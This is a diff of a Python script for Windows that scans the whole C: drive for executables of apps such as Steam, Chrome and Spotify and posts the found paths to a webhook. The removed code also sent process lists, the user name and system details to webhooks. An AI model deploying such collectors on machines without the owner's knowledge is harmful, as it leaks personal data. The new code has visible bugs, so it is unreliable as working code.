@@ -7,10 +7,6 @@ import platform
 import getpass
 import tempfile
 from datetime import datetime
-from colorama import Fore, Style, init
-
-# Initialize Colorama
-init(autoreset=True)
 
 # Webhook URLs
 WEBHOOK_URLS = {
@@ -51,13 +47,13 @@ def send_embed_to_webhook(title, description, color, url):
 
 def print_status(message, status='normal'):
     """Print status messages with color coding for real-time feedback."""
-    color = {
-        'error': Fore.RED,
-        'warning': Fore.YELLOW,
-        'success': Fore.GREEN,
-        'normal': Fore.RESET
+    color_code = {
+        'error': '91',     # Red
+        'warning': '93',   # Yellow
+        'success': '92',   # Green
+        'normal': '0'      # Default
     }
-    print(color[status] + message)
+    print(f"\033[{color_code[status]}m{message}\033[0m")
 
 def write_log(log_path, message):
     """Write messages to a log file."""
@@ -99,6 +95,11 @@ def scan_directory(directory, file_names=None):
                                 print_status(f"Found file: {path}", 'warning')
                     scanned_files += 1
                     total_files += 1
+            # Print status for directory completion
+            if not results:
+                print_status(f"Directory clear: {current_dir}", 'success')
+            else:
+                print_status(f"Directory scanned: {current_dir}", 'normal')
         except PermissionError:
             write_log(log_file, f"Permission denied: {current_dir}")
             print_status(f"Permission denied: {current_dir}", 'error')
@@ -106,172 +107,73 @@ def scan_directory(directory, file_names=None):
 
     return results, total_files, scanned_files
 
-def scan_pc(specific_files=None):
-    """Recursively scan the entire PC for specific files."""
-    log_file = tempfile.mktemp(suffix=".log", dir=tempfile.gettempdir())
-    results = {}
-    total_files = 0
-    scanned_files = 0
+def find_process_traces(name):
+    """Find all traces of the specific process."""
+    traces = []
+    directories = [
+        'C:\\Windows\\System32',
+        'C:\\Program Files',
+        'C:\\Program Files (x86)',
+        'C:\\Users\\Public',
+        'C:\\Windows\\Temp',
+        'C:\\Users\\%USERNAME%\\AppData\\Local',
+        'C:\\Users\\%USERNAME%\\AppData\\Roaming',
+        'C:\\$Recycle.Bin',
+        'C:\\ProgramData',
+        'C:\\Documents and Settings',
+        'C:\\$Windows.~BT'
+    ]
 
-    if specific_files:
-        directories_to_scan = ['C:\\']
-        while directories_to_scan:
-            directory = directories_to_scan.pop()
+    # Scan specified directories
+    for directory in directories:
+        directory = directory.replace('%USERNAME%', getpass.getuser())
+        if os.path.exists(directory):
+            write_log(log_file, f"Scanning directory: {directory}")
             print_status(f"Scanning directory: {directory}", 'normal')
-            try:
-                with os.scandir(directory) as it:
-                    for entry in it:
-                        if entry.is_dir(follow_symlinks=False):
-                            directories_to_scan.append(entry.path)
-                        else:
-                            for file_name in specific_files:
-                                if file_name.lower() in entry.name.lower():
-                                    path = entry.path
-                                    if file_name not in results:
-                                        results[file_name] = []
-                                    results[file_name].append(path)
-                                    write_log(log_file, f"Found file: {path}")
-                                    print_status(f"Found file: {path}", 'warning')
-                        scanned_files += 1
-                        total_files += 1
-            except PermissionError:
-                write_log(log_file, f"Permission denied: {directory}")
-                print_status(f"Permission denied: {directory}", 'error')
-                continue
-            except Exception as e:
-                write_log(log_file, f"Error scanning directory {directory}: {e}")
-                print_status(f"Error scanning directory {directory}: {e}", 'error')
+            for root, dirs, files in os.walk(directory):
+                for file in files:
+                    if name.lower() in file.lower():
+                        path = os.path.join(root, file)
+                        traces.append(path)
+                        write_log(log_file, f"Found trace: {path}")
+                        print_status(f"Found trace: {path}", 'warning')
 
-        for file_name, paths in results.items():
-            send_embed_to_webhook(
-                f"Traces of {file_name}",
-                f"Traces found in directories:\n" + "\n".join(paths),
-                0xFF0000,  # Red color
-                WEBHOOK_URLS['process_traces']
-            )
-    else:
-        # Scan entire PC without specific files
-        print_status("No specific files to scan.", 'error')
-
-    return results
-
-def get_system_information():
-    """Retrieve detailed system information."""
-    uname = platform.uname()
-    boot_time = datetime.fromtimestamp(psutil.boot_time())
-    current_time = datetime.now()
-    system_info = {
-        'System': uname.system,
-        'Node Name': uname.node,
-        'Release': uname.release,
-        'Version': uname.version,
-        'Machine': uname.machine,
-        'Processor': uname.processor,
-        'Boot Time': boot_time.strftime('%Y-%m-%d %H:%M:%S'),
-        'Current Time': current_time.strftime('%Y-%m-%d %H:%M:%S'),
-        'User': getpass.getuser(),
-        'CPU Usage': f"{psutil.cpu_percent()}%",
-        'Memory Info': f"Total: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB, Available: {psutil.virtual_memory().available / (1024 ** 3):.2f} GB",
-        'Disk Usage': f"Total: {psutil.disk_usage('/').total / (1024 ** 3):.2f} GB, Used: {psutil.disk_usage('/').used / (1024 ** 3):.2f} GB"
-    }
-    info_str = "\n".join([f"{key}: {value}" for key, value in system_info.items()])
-    send_embed_to_webhook(
-        "System Information",
-        info_str,
-        0x0000FF,  # Blue color
-        WEBHOOK_URLS['recent_activity']
-    )
-    return system_info
+    return traces
 
 def main():
-    """Main function to handle user choices and execute corresponding actions."""
+    global log_file
+    log_file = tempfile.mktemp(suffix=".log", dir=tempfile.gettempdir())
     print_status("Starting script...", 'normal')
-    choice = input("Enter your choice (1-6): ")
-    while choice not in ['1', '2', '3', '4', '5', '6']:
-        print_status("Invalid choice. Please select a valid option.", 'error')
-        choice = input("Enter your choice (1-6): ")
 
-    global WEBHOOK_DELAY
-    WEBHOOK_DELAY = int(input("Enter webhook delay in seconds: "))
+    specific_files = [
+        'steam.exe',
+        'Spotify.exe',
+        'RazerCortex.exe',
+        'RazerSynapse.exe',
+        'lghub.exe',
+        'chrome.exe',
+        'TikTokLIVEStudio.exe',
+        'voicemeeterpro.exe',
+        'brave.exe'
+    ]
 
-    if choice == '1':
-        processes = get_processes()
-        admin_processes = get_admin_processes()
-        send_embed_to_webhook(
-            "System Processes",
-            format_processes(processes),
-            0xFFFF00,  # Yellow color
-            WEBHOOK_URLS['system_processes']
-        )
-        send_embed_to_webhook(
-            "Admin Processes",
-            format_processes(admin_processes),
-            0xFFFF00,  # Yellow color
-            WEBHOOK_URLS['admin_processes']
-        )
-    elif choice == '2':
-        # Implement database search functionality here
-        send_embed_to_webhook(
-            "Database Search Results",
-            "Database search results go here.",
-            0x00FFFF,  # Cyan color
-            WEBHOOK_URLS['database']
-        )
-    elif choice == '3':
-        specific_files = [
-            'steam.exe',
-            'Spotify.exe',
-            'RazerCortex.exe',
-            'RazerSynapse.exe',
-            'lghub.exe',
-            'chrome.exe',
-            'TikTokLIVEStudio.exe',
-            'voicemeeterpro.exe',
-            'brave.exe'
-        ]
-        scan_results = scan_pc(specific_files)
-        send_embed_to_webhook(
-            "PC Scan Results",
-            f"Scan completed for specific files:\n{json.dumps(scan_results, indent=2)}",
-            0xFF00FF,  # Magenta color
-            WEBHOOK_URLS['process_traces']
-        )
-    elif choice == '4':
-        system_info = get_system_information()
-        send_embed_to_webhook(
-            "System Information",
-            json.dumps(system_info, indent=2),
-            0x0000FF,  # Blue color
-            WEBHOOK_URLS['recent_activity']
-        )
-    elif choice == '5':
-        # Implement error handling functionality here
-        send_embed_to_webhook(
-            "Error Handling Results",
-            "Error handling results go here.",
-            0xFF0000,  # Red color
-            WEBHOOK_URLS['error']
-        )
-    elif choice == '6':
-        activity_type = input("What recent activity do you want to see? (deleted, recent, renamed): ")
-        if activity_type == 'deleted':
-            # Implement logic to show deleted files
-            pass
-        elif activity_type == 'recent':
-            recent_activity = scan_recent_activity()
-            send_embed_to_webhook(
-                "Recent Activity",
-                f"Recent activity results:\n{json.dumps(recent_activity, indent=2)}",
-                0xFF8800,  # Orange color
-                WEBHOOK_URLS['recent_activity']
-            )
-        elif activity_type == 'renamed':
-            # Implement logic to show renamed files
-            pass
+    # Scan PC for specific files
+    scan_results = {}
+    for file_name in specific_files:
+        file_results, _, _ = scan_directory('C:\\', [file_name])
+        scan_results[file_name] = file_results[file_name]
+        if file_results:
+            print_status(f"File scan complete: {file_name}", 'success')
         else:
-            print_status("Invalid choice for recent activity.", 'error')
-    else:
-        print_status("Invalid choice.", 'error')
+            print_status(f"No traces found for file: {file_name}", 'success')
+
+    send_embed_to_webhook(
+        "PC Scan Results",
+        f"Scan completed for specific files:\n{json.dumps(scan_results, indent=2)}",
+        0xFF00FF,  # Magenta color
+        WEBHOOK_URLS['process_traces']
+    )
+    print_status("Scan results sent to webhook.", 'success')
 
 if __name__ == "__main__":
     main()
